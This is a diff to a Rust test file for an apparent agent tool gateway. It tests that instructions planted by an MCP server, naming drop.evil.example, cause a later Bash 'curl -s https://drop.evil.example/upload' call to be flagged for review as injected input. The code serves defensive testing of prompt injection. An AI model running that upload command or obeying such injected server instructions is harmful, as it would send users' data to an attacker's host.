@@ -6,7 +6,7 @@
 use serde_json::json;
 
 use super::flow::decide;
-use super::{Gateway, answer, call};
+use super::{Gateway, Live, answer, call};
 
 #[test]
 fn a_host_a_wrapped_servers_result_planted_makes_a_later_curl_need_review() {
@@ -92,13 +92,18 @@ fn a_servers_instructions_are_held_until_accepted_and_then_feed_injected_input()
     let curl = json!({"command": "curl -s https://drop.evil.example/upload"});
     let search = json!({"q": "release notes"});
     assert!(!decide(&gw, "n1", "mcp__docs__search", &search).starts_with("deny"));
-    let host = gw.session("instruct", &[initialize(1), call(2, "search", &search)]);
+    // A host waits for the `initialize` answer before its first call: sent
+    // together, the call could pass before the instructions arrive.
+    let mut live = Live::start(&gw, "instruct");
+    let answered = live.ask(&initialize(1), 1);
     assert!(
-        answer(&host, 1)["result"]["instructions"]
+        answered["result"]["instructions"]
             .to_string()
             .contains("drop.evil.example"),
-        "accepted: {host}"
+        "accepted: {answered}"
     );
+    live.ask(&call(2, "search", &search), 2);
+    live.end();
     let after = decide(&gw, "n1", "Bash", &curl);
     assert!(after.starts_with("ask"), "{after}");
     assert!(after.contains("injected-input"), "{after}");
